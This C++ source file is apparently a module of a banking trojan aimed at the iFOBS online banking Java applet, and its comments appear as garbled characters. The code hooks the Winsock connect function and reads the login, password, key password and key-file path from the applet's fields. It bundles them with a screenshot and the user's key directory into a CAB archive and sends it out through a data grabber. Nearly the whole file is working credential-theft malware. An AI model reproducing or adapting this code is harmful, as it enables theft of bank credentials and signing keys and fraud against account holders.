//---------------------------------------------------------------------------

#pragma hdrstop

#include <windows.h>
#include <tlhelp32.h>

#include "IfobsOnline.h"
#include "BotClasses.h"
#include "WndUtils.h"
#include "Utils.h"
#include "GetApi.h"
#include "CabPacker.h"
#include "Loader.h"
#include "StrConsts.h"
#include "Splice.h"
#include "ScreenShots.h"
//---------------------------------------------------------------------------


HWND SearchJavaAppletWindow();


//==========================================================
//        ���������� ������ �������

namespace IfobsOnline
{
	DWORD PID = 0;        // ��� ��������, � ������� �������� ������
	HWND  AppletWnd = 0;  // ������������� ���� ������

	// ���������� ���� ��� ��������� �����
	typedef int (WINAPI *TConnect)(SOCKET s, const struct sockaddr *name, int namelen);


	TConnect Real_Connect = NULL;



	// ������� ��������� ���������
	int WINAPI Hook_Connect(SOCKET s, const struct sockaddr *name, int namelen )
	{
		if (!IsWindowVisible(AppletWnd))
			AppletWnd = NULL;

		if (AppletWnd == NULL)
		{
			TIfobsOnline Grabber;
			Grabber.SendLog();
		}
		return Real_Connect(s, name, namelen);
	}


	//*****************************************************
	//  Initialize - ������ �������������� ������
	//*****************************************************
	bool Initialize()
	{
		// ��������� ������� �������
		if (IsNewProcess(PID))
		{
			Real_Connect = NULL;
			AppletWnd    = NULL;
		}

		// ��������� �� ������� ��� ������������� �����
		if (Real_Connect) return true;


		// ������������� ����
		if ( HookApi( DLL_WINSOCK, 0xEDD8FE8A /* connect */, &Hook_Connect ) )
		{
			__asm mov [Real_Connect], eax
		}

	}
    //---------------------------------------------------------------------------
}


//==========================================================





//---------------------------------------------------------------------------
TIfobsOnline::TIfobsOnline()
	: TKeyLogger()
{

}
//----------------------------------------------------------------------------


BOOL CALLBACK JavaAppletSearchWnd(HWND Wnd, LPARAM Data)
{
	const static DWORD WndHash = 0x7C3C1E9A /* sunawtcanvas */;

	HWND* Result = (HWND*)Data;

	if (GetWndClassHash(Wnd, true) == WndHash)
		*Result = Wnd;

	if (*Result == NULL)
    	pEnumChildWindows(Wnd, JavaAppletSearchWnd, Data);

	return *Result == NULL;
}


//-----------------------------------------------------
//  SearchJavaAppletWindow - ������� ���� ������� ����
//                           ��� ������
//-----------------------------------------------------
HWND SearchJavaAppletWindow()
{
	// � ������ ��������� ����� ������� ���� ���� ��������

	//SunAwtFrame
	HWND Wnd = NULL;

	pEnumChildWindows(0, JavaAppletSearchWnd, (LPARAM)&Wnd);

	return Wnd;
}
//----------------------------------------------------------------------------


BOOL CALLBACK IfobsOnlineEnumWndProc(HWND Wnd, LPARAM Data)
{
	TIfobsOnline* Client = (TIfobsOnline*)Data;

	Client->AddWndData(Wnd);

	pEnumChildWindows(Wnd, IfobsOnlineEnumWndProc, Data);

	return TRUE;
}



//-----------------------------------------------------
//  BindData - ������� ��������� ������� ���� ��� �����
//             ����������� ������
//-----------------------------------------------------
bool TIfobsOnline::BindData()
{
	IfobsOnline::AppletWnd = SearchJavaAppletWindow();
    bool Result = false;
	if (IfobsOnline::AppletWnd)
	{
		pEnumChildWindows(IfobsOnline::AppletWnd, IfobsOnlineEnumWndProc, (LPARAM)this);

		Result = !FLogin.IsEmpty() && !FPassword.IsEmpty();

		if (Result)
		{
//			string S;
//			S.Format("Login: %s\nPassword: %s\nKeyPass: %s\nKeyPah: %s", FLogin.t_str(), FPassword.t_str(), FKeyPassword.t_str(), FKeyFilePath.t_str());
//			pOutputDebugStringA(S.t_str());
        }
	}
	return Result;
}
//----------------------------------------------------------------------------

void TIfobsOnline::AddWndData(HWND Wnd)
{
	DWORD Class = GetWndClassHash(Wnd, true);
	if (Class == 0xCB934F4 /* edit */)
	{
		LONG ID = (LONG)pGetWindowLongA(Wnd, GWL_ID);
		if (ID >= 1 && ID <= 4)
		{
			string Text = GetWndText2(Wnd);
			switch (ID) {
				case 1: FLogin       = Text; break;
				case 2: FPassword    = Text; break;
				case 3: FKeyPassword = Text; break;
				case 4: FKeyFilePath = Text; break;
			}
        }
	}
}
//----------------------------------------------------------------------------

//-----------------------------------------------------
//  PackData - ������� ������������ ������ � ��� �����
//             � ������ ������ ���������� ���� � ���
//             �����
//-----------------------------------------------------
string TIfobsOnline::PackData()
{
	string CABName;

	CABName = "c:\\ifobs.cab";//File::GetTempName2A();
	HCAB Cab = CreateCab(CABName.t_str());

	if (Cab)
	{
		// ����������� ����� � ������
		TBotStrings Fields;
		Fields.ValueDelimeter = ": ";
		Fields.AddValue("Login", FLogin);
		Fields.AddValue("Password", FPassword);
		Fields.AddValue("KeyPassword", FKeyPassword);

		AddStringToCab(Cab, Fields.GetText(), "Log.txt");

		// ��������� ��������
		string Screen = File::GetTempName2A();
		bool AddScreen = ScreenShot::Make(0, 0, 0, 0, 0, NULL, Screen.t_str());
		if (AddScreen)
			AddFileToCab(Cab, Screen.t_str(), "Screen.png");
		pDeleteFileA(Screen.t_str());

		// ��������� �����
		AddFilesToCab(Cab);

		// ��������� ����
		CloseCab(Cab);
	}

	return CABName;
}
//----------------------------------------------------------------------------

//-----------------------------------------------------
//  AddFilewsToCab - ������ ��������� ����� ������ �
//                   �����
//-----------------------------------------------------
void TIfobsOnline::AddFilesToCab(LPVOID Cab)
{
	if (!DirExists(FKeyFilePath.t_str())) return;

    // ��������� ������������ ������ ����� � �������
	if (SizeFolderLess(FKeyFilePath.t_str(), IFOBS_MAX_KEY_PATH_SIZE, NULL))
		AddDirToCab(Cab, FKeyFilePath.t_str(), "Keys");
}
//----------------------------------------------------------------------------

//-----------------------------------------------------
//  SendLog - ������ �������� ���
//-----------------------------------------------------
void TIfobsOnline::SendLog()
{
	if (BindData())
	{
		string Cab = PackData();
		if (!Cab.IsEmpty())
		{
			DataGrabber::SendCabDelayed(NULL, Cab.t_str(), GetStr(EStrSystemIfobsOnline).t_str());
			//spDeleteFileA(Cab.t_str());
		}
    }
}
//----------------------------------------------------------------------------



